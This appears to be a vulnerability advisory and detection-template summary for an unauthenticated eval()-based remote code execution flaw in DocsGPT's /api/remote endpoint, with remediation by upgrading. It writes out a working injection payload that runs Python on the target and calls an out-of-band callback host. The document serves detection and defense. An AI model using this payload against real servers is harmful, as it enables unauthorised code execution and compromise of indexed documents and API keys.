## Vulnerability
DocsGPT versions from 0.8.1 through 0.12.0 contain an unauthenticated remote code execution vulnerability. Due to improper parsing of JSON data using `eval()` an unauthorized attacker could send arbitrary Python code to be executed via the `/api/remote` endpoint.

Impact includes complete system compromise and potential access to all indexed documents and API keys. Remediation requires upgrading to version 0.12.1 or later.

## PoC / Detection
Classification: rce

The template issues a single POST request to `/api/remote` using `application/x-www-form-urlencoded` content-type. The `data` parameter embeds a crafted JSON payload containing the injection `rce\\":__import__('requests').get('http://{{interactsh-url}}/')}#":11}` designed to trigger arbitrary Python code execution via `eval()`. Detection confirms success by matching on a DNS interaction to the interactsh server plus the strings `"task_id":` and `"status":` both present in the response body.
